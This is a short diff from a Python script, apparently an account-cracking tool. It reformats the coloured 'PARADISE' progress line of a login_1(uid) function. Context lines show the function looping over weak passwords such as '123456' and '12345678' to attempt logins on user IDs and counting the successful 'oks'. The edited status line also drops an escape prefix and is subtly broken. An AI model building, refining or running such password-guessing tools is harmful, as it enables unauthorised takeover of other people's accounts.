@@ -436,16 +436,13 @@ def login_1(uid):
     global loop
     session = requests.session()
     try:
-        line = (
-            "\x1b[2K\r"
-            f"\x1b[38;5;220m🌟PARADISE🌟"
-            f"\x1b[38;5;45m━━━━━(\x1b[38;5;220m{loop}"
-            f"\x1b[38;5;45m)━━━━━(\x1b[38;5;220mWOKEH"
-            f"\x1b[38;5;45m)━━━━━(\x1b[38;5;220m{len(oks)}"
-            f"\x1b[38;5;45m)"
+        sys.stdout.write(
+            f"\x1b[2K\r"
+            f"\x1b[38;5;220m🌟PARADISE🌟 "
+            f"\x1b[38;5;45m({loop}) "
+            f"(WOKEH) "
+            f"(38;5;220m{len(oks)})"
         )
-
-        sys.stdout.write(line)
         sys.stdout.flush()
         for pw in ('123456', '1234567', '12345678', '123456789'):
             data = {
